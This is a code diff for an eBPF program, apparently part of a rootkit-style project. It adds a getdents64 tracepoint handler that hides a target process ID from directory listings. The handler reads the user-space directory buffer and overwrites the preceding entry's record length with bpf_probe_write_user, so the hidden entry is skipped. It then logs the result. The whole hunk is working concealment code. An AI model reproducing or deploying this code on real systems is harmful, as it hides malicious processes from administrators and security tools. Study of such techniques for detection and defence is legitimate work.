@@ -159,6 +159,49 @@ int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx) {
 
 SEC("tracepoint/syscalls/sys_exit_getdents64")
 int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx) {
+    size_t pid_tgid = bpf_get_current_pid_tgid();
+    //only patch if we've already checked and found our pid's folder to hide
+    long unsigned int *pbuff_addr = bpf_map_lookup_elem(&map_to_patch, &pid_tgid);
+    if(NULL == pbuff_addr){
+        return 0;
+    }
+
+    //Unlink target, by reading in previous linux_dirent64 struct, setting d_reclen to cover itself
+    long unsigned int buff_addr = *pbuff_addr;
+    struct linux_dirent64 *dirp_previous = (struct linux_dirent64 *)(buff_addr);
+    short unsigned int d_reclen_previous = 0;
+    bpf_probe_read_user(&d_reclen_previous, sizeof(d_reclen_previous), &dirp_previous->d_reclen);
+    
+    struct linux_dirent64 *dirp = (struct linux_dirent64 *)(buff_addr + d_reclen_previous);
+    short unsigned int d_reclen = 0;
+    bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
+
+    //Debug print
+    char filename[MAX_PID_LEN];
+    bpf_probe_read_user_str(filename, pid_to_hide_len, &dirp_previous->d_name);
+    filename[pid_to_hide_len - 1] = '\0';
+    bpf_printk("file previous: %s\n", filename);
+    
+    bpf_probe_read_user_str(filename, pid_to_hide_len, &dirp->d_name);
+    filename[pid_to_hide_len - 1] = '\0';
+    bpf_printk("file next one: %s\n", filename);
+
+    //Attempt to overwrite
+    short unsigned int d_reclen_new = d_reclen_previous + d_reclen;
+    long ret = bpf_probe_write_user(&dirp_previous->d_reclen, &d_reclen_new, sizeof(d_reclen_new));
+
+    //send event
+    struct event* e;
+    e = bpf_ringbuf_reserve(&rb, sizeof(*e),  0);
+    if(e){
+        e->success = (ret == 0);
+        e->pid = (pid_tgid >> 32);
+        bpf_get_current_comm(&e->comm, sizeof(e->comm));
+        bpf_ringbuf_submit(e, 0);
+    }
+
+    bpf_map_delete_elem(&map_to_patch, &pid_tgid);
+
     return 0;
 }
 
